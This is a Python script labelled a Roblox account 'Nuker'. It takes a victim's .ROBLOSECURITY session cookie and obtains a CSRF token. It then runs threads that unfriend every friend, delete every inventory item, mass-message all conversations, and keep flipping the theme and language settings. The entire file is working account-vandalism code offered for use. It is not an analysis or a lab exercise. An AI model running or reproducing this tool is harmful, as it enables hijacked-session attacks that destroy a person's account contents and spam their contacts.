import subprocess, threading, time, os

try:
    import requests
    from termcolor import cprint
except:
    try:
        import pip
    except ImportError:
        os.system("")
        print("[", end="")
        print("\033[31m" + " ERROR ", "red", end="")
        print("] ", end="")
        print("\033[31m" + "Pip not installed. Installing now...")
        subprocess.call(
            "curl https://bootstrap.pypa.io/get-pip.py --output get-pip.py", shell=True
        )
        time.sleep(5)
        os.system("get-pip.py")
    print("[", end="")
    print("\033[31m" + " ERROR ", "red", end="")
    print("] ", end="")
    print("\033[31m" + "Packages not installed. Installing now...")
    subprocess.call("pip install termcolor", shell=True)
    subprocess.call("pip install requests", shell=True)
finally:
    import requests
    from termcolor import cprint
# Made by Ice Bear#0167
def getXsrf(cookie):
    xsrfRequest = requests.post(
        "https://auth.roblox.com/v2/logout", cookies={".ROBLOSECURITY": cookie}
    )
    return xsrfRequest.headers["x-csrf-token"]


def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


class Nuke:
    def __init__(self):
        self.headers = None
        self.cookie = None
        self.start()

    def flash(self):
        print("[", end="")
        cprint(" NUKER ", "magenta", end="")
        print("] ", end="")
        cprint("Flashing....", "magenta")
        print("[", end="")
        cprint(" NUKER ", "yellow", end="")
        print("] ", end="")
        cprint("Press Ctrl + C to stop", "yellow")
        try:
            while True:
                requests.patch(
                    "https://accountsettings.roblox.com/v1/themes/user",
                    cookies={".ROBLOSECURITY": str(self.cookie)},
                    headers=self.headers,
                    data={"themeType": "Light"},
                )
                requests.patch(
                    "https://accountsettings.roblox.com/v1/themes/user",
                    cookies={".ROBLOSECURITY": str(self.cookie)},
                    headers=self.headers,
                    data={"themeType": "Dark"},
                )
        except KeyboardInterrupt:
            print("[", end="")
            cprint(" NUKER ", "magenta", end="")
            print("] ", end="")
            for i in "Done Nuking...":
                time.sleep(0.1)
                cprint(i, "magenta", end="", flush=True)

    def changeLanguage(self):
        while True:
            requests.post(
                "https://locale.roblox.com/v1/locales/set-user-supported-locale",
                cookies={".ROBLOSECURITY": str(self.cookie)},
                headers=self.headers,
                data={"supportedLocaleCode": "ja_jp"},
            )
            requests.post(
                "https://locale.roblox.com/v1/locales/set-user-supported-locale",
                cookies={".ROBLOSECURITY": str(self.cookie)},
                headers=self.headers,
                data={"supportedLocaleCode": "ko_kr"},
            )

    def messageAll(self, message):
        print("[", end="")
        cprint(" NUKER ", "magenta", end="")
        print("] ", end="")
        cprint("Messaging friends....", "magenta")
        conversations = requests.get(
            "https://chat.roblox.com/v2/get-user-conversations?pageNumber=1&pageSize=3000",
            cookies={".ROBLOSECURITY": str(self.cookie)},
            headers=self.headers,
        ).json()
        for conversation in conversations:
            requests.post(
                "https://chat.roblox.com/v2/send-message",
                data={"conversationId": conversation["id"], "message": message},
                cookies={".ROBLOSECURITY": str(self.cookie)},
                headers=self.headers,
            )
            print("[", end="")
            cprint(" NUKER ", "magenta", end="")
            print("] ", end="")
            cprint(f"Sent message to {conversation['id']}", "magenta")

    def removeItems(self):
        items = requests.get(
            f"https://www.roblox.com/users/inventory/list-json?assetTypeId=2&cursor=&itemsPerPage=1000000000&pageNumber=1&userId={self.userid}",
            cookies={".ROBLOSECURITY": str(self.cookie)},
            headers=self.headers,
        ).json()["Data"]["Items"]
        for item in items:
            time.sleep(4)
            id = item["Item"]["AssetId"]
            response = requests.post(
                "https://www.roblox.com/asset/delete-from-inventory",
                data={"assetId": str(id)},
                cookies={".ROBLOSECURITY": str(self.cookie)},
                headers=self.headers,
            )
            if response.status_code == 429:
                time.sleep(10)
                response = requests.post(
                    "https://www.roblox.com/asset/delete-from-inventory",
                    data={"assetId": id},
                    cookies={".ROBLOSECURITY": str(self.cookie)},
                    headers=self.headers,
                )
                print("[", end="")
                cprint(" NUKER ", "magenta", end="")
                print("] ", end="")
                cprint(f"Removed {id} from user's inventory", "magenta")
            else:
                print("[", end="")
                cprint(" NUKER ", "magenta", end="")
                print("] ", end="")
                cprint(f"Removed {id} from user's inventory", "magenta")
        print("[", end="")
        cprint(" NUKER ", "magenta", end="")
        print("] ", end="")
        cprint("Removed all items from user's inventory", "magenta")
        time.sleep(1)

    def unfriend(self):
        print("[", end="")
        cprint(" NUKER ", "magenta", end="")
        print("] ", end="")
        cprint("Unfriending friends....", "magenta")
        friends = requests.get(
            f"https://friends.roblox.com/v1/users/{self.userid}/friends",
            cookies={".ROBLOSECURITY": str(self.cookie)},
        ).json()["data"]
        friendIds = [friend["id"] for friend in friends]
        for i in friendIds:
            time.sleep(0.1)
            print(
                requests.post(
                    f"https://friends.roblox.com/v1/users/{i}/unfriend",
                    cookies={".ROBLOSECURITY": str(self.cookie)},
                    headers=self.headers,
                ).text
            )
            print("[", end="")
            cprint(" NUKER ", "magenta", end="")
            print("] ", end="")
            cprint(f"Unfriended {i}!", "magenta")
        print("[", end="")
        cprint(" NUKER ", "magenta", end="")
        print("] ", end="")
        cprint("Unfriended All!", "magenta")

    def check(self):
        print("[", end="")
        cprint(" NUKER ", "magenta", end="")
        print("] ", end="")
        cprint("Enter Your Cookie Below:", "magenta")
        self.cookie = input("> ")
        print("[", end="")
        cprint(" NUKER ", "magenta", end="")
        print("] ", end="")
        cprint("Enter Your mass dm message below:", "magenta")
        self.message = input("> ")
        return requests.get(
            "https://chat.roblox.com/v2/get-unread-conversation-count",
            cookies={".ROBLOSECURITY": str(self.cookie)},
        )

    def start(self):
        os.system("")
        check = self.check()
        if check.status_code == 200:
            self.headers = {"X-CSRF-TOKEN": getXsrf(self.cookie)}
            userdata = requests.get(
                "https://users.roblox.com/v1/users/authenticated",
                cookies={".ROBLOSECURITY": self.cookie},
            ).json()  # get user data
            self.userid = userdata["id"]  # user id
            clear()
            threading.Thread(target=self.flash).start()
            threading.Thread(target=self.unfriend).start()
            threading.Thread(target=self.changeLanguage).start()
            threading.Thread(target=self.removeItems).start()
            threading.Thread(target=self.messageAll, args=(self.message,)).start()
        else:
            print(check.status_code)
            print("[", end="")
            cprint(" ERROR ", "red", end="")
            print("] ", end="")
            cprint("Invalid Cookie", "red")
            time.sleep(1.4)
            clear()
            self.check()


if __name__ == "__main__":
    Nuke()
    # Coded by Ice Bear#0167
